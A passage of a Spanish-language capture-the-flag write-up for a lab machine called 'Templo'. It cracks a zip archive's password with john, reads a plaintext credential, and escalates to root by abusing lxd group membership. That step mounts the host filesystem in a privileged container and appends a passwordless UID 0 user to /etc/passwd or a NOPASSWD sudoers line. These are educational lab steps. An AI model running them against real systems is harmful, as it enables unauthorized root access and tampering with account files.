www-data@TheHackersLabs-Templo:/opt/.XXX$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Ahora desde nuestar maquina de atacante, realizamos la peticion para descargarlo
```bash
wget http://192.168.100.29:8080/backup.zip
```

Si intentamos descomprimirlo nos pide una contrasena que no tenemos, 
```bash
7z x backup.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 378 bytes (1 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 378

    
Enter password (will not be echoed):
ERROR: Wrong password : backup/Rodgar.txt
```

Asi que usaremos **john** para realizar un ataque de fuerza bruta y lograr obtener la contrasena de ese archvios
```bash
zip2john backup.zip > hash
```

Iniciamos el ataque:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
batman           (backup.zip/backup/Rodgar.txt)
```

Tenemos la password valida: **( batman )**
```bash
7z x backup.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 378 bytes (1 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 378

    
Would you like to replace the existing file:
  Path:     ./backup/Rodgar.txt
  Size:     0 bytes
  Modified: 2024-08-03 21:02:42
with the file from archive:
  Path:     backup/Rodgar.txt
  Size:     24 bytes (1 KiB)
  Modified: 2024-08-03 21:02:42
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                          
Enter password (will not be echoed): batman
Everything is Ok

Folders: 1
Files: 1
Size:       24
Compressed: 378
```

Ahora si revisamos el contenido, vemos lo siguiente:
```bash
cat Rodgar.txt

File: Rodgar.txt
──────────────────────
6rK5£6iqF;o|8dmla859/_
```

Ahora nos logueamos como este usuario:
```bash
su rodgar
Password: 6rK5£6iqF;o|8dmla859/_
```
###### Usuario `[ rodgar ]`:
Flag de usuario:
```bash
ls -la

-rw-rw-r-- 1 rodgar rodgar   33 ago  6  2024 user.txt
```

Si revisamos los grupos a los que pertenece este usuario tenemos lo siguiente:
```bash
id
uid=1000(rodgar) gid=1000(rodgar) groups=1000(rodgar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```

Ahora sabiendo esto podemos explotar el grupo **lxd** Realizaremos lo siguiete para abusar de este grupo
Inicializamos LXD en la maquina victima:
```bash
lxd init --auto
```

Ahora descargamos desde la maquina victima, una imagen ligera de **Alpine**
`security.privileged=true` → Otorga permisos elevados al contenedor.
```bash
lxc launch images:alpine/edge malicious-container -c security.privileged=true
```

Ahora montamos el **fileSystem** de la maquina victima en el contenedor maliciosos
Esto monta `/` (filesystem completo) en `/mnt/root` dentro del contenedor.
```bash
lxc config device add malicious-container host-root disk source=/ path=/mnt/root recursive=true
```

Ahora desde la maquina victima inicializamos el contenedor malicioso:
Tendrmos una bash como root en el contendor
```bash
lxc exec malicious-container /bin/sh
```

Ahora revisamos la montura si se creo correctamente:
```bash
# Deberiamos de ver toda la raiz
ls /mnt/root
```

Ahora tenemos dos opciones: Anadir un usuario con el identificador **UID** 0 de root
```bash
# Esto crea un usuario (hacker) con UID 0 (equivalente a root).
echo "hacker::0:0::/root:/bin/bash" >> /mnt/root/etc/passwd
```

O tambiendo podemos modificar el archivo **sudoers** para agregar y permitir que el suaurio **victim** ejecute cualquier comando con **sudo** sin proporcionar contrasena
```bash
echo "victim ALL=(ALL) NOPASSWD:ALL" >> /mnt/root/etc/sudoers
```

Ahora salimos del contenedor y explotamos el privilegio:
```bash
# Comando para escalar al usuario: ( root )
su hacker # Si fue de la priemera forma
sudo su # Si fue de la segunda forma
```

---

## Evidencia de Compromiso
Flag de root:
```bash
ls -la

-rw-r--r--  1 root root   33 ago  6  2024 root.txt
```

```bash
# Captura de pantalla o output final
root@TheHackersLabs-Templo:/home/rodgar# echo -e "\n[+] Hacked: $(whoami)\n"

[+] Hacked: root
```

---

## Lecciones Aprendidas
1. Aprendimos a abusar del grupo **LXD**